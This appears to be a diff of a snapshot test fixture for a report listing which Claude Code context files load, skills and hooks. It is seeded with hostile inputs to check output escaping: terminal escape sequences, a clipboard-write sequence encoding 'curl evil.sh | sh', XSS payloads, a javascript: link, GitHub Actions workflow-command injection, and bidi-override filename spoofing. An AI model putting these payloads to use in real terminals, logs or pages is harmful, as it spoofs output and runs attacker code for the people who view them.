@@ -1,10 +1,13 @@
 Claude Code context · ::error::cwd<U+001B>[2J<U+001B>[Hcleared
 Assumes <U+001B>]8;;https://evil.example<U+001B>\click<U+001B>]8;;<U+001B>\ = x⏎::add-mask::secret⏎::set-output name=a::b (rule option)
-Not visible: zero<U+200B>width<U+200C>non<U+200D>joiner<U+2060>word<U+FEFF>bom (user)
+Not visible: zero<U+200B>width<U+200C>non<U+200D>joiner<U+2060>word<U+FEFF>bom,
+  user settings ($<img src=x onerror=alert(1)> <script>alert(1)<, ~/copy<U+001B>]52;c;Y3VybCBldmlsLnNoIHwgc2g=<U+0007>done)
 
 At session start                                           bytes  ≈tokens
-  1  ::error file=x::pwned/CLAUDE.md → realinvoice<U+202E>txt.exe and <U+202A>embed<U+202C> <U+200E><U+200F><U+061C>.md     10        3
-  2      └ @<img src=x onerror=alert(1)> <script>alert(1)</script> &lt;b&gt;     20        5
+  1  ::error file=x::pwned/CLAUDE.md → realinvoice<U+202E>txt.exe and <U+202A>embed<U+202C> <U+200E><U+200F><U+061C>.md
+                                                              10        3
+  2      └ @<img src=x onerror=alert(1)> <script>alert(1)</script> &lt;b&gt;
+                                                              20        5
   3  line one⏎::stop-commands::x (cut at byte 12, line 2)     30        8
   4  Skills listing (1 skill, metadata)                       40       10
                                                     Total    100     ≈ 26
@@ -13,12 +16,14 @@ At session start                                           bytes  ≈tokens
   Hooks:            closes #1, GH-2 and owner/repo#3 a | b || c \| d → <U+001B>[2J<U+001B>[Hcleared (fails open) (runs a downloaded script)
 
 On demand
-  .claude/skills/ping @octocat and @github/security-team, mail me@example.com/SKILL.md  body 400 bytes ≈ 100, when the model picks it
+  .claude/skills/ping @octocat and @github/security-team, mail me@example.com/SKILL.md
+                         body 400 bytes ≈ 100, when the model picks it
   a | b || c \| d        50 bytes ≈ 13, when Claude opens ::warning::glob, [click](javascript:alert(1)) ![x](https://evil.example/p.png) <https://evil.example>
   .claude/commands/x.md  60 bytes ≈ 15, when you run /# heading *em* **strong** `code` ~~del~~ $x$ > quote - item 1. item
 
 Skipped
-  invoice<U+202E>txt.exe and <U+202A>embed<U+202C> <U+200E><U+200F><U+061C> › line one⏎::error::fake annotation  not valid JSON ?  evil:rule,title=x
+  invoice<U+202E>txt.exe and <U+202A>embed<U+202C> <U+200E><U+200F><U+061C> › line one⏎::error::fake annotation
+    not valid JSON ?  evil:rule,title=x
 
 Not read by Claude Code: ::stop-commands::token
 
@@ -26,10 +31,15 @@ Incomplete
   eight-bit <U+009B>31mCSI<U+009B>0m and NEL<U+0085>    not analyzed
   tags<U+E0001><U+E0049><U+E0067><U+E006E><U+E007F>end  not analyzed: the scan did not read the file
 
-                                    Claude Code
+Files by agent                      Claude Code
 <U+003A>:error::matrix                     startup
-<img src=x onerror=alert(1)> <script>alert(1)</script> &lt;b&gt;   skipped
+<img src=x onerror=alert(1)> <script>alert(1)</script> &lt;b&gt;
+                                    skipped
 safe text⏎FAKE: all checks passed   —
+
+startup  loaded at session start
+skipped  not loaded; the plan says why
+—        not read by this agent
 
 ≈tokens = characters ÷ 4
 ? = unverified: neither documentation nor source code confirms it
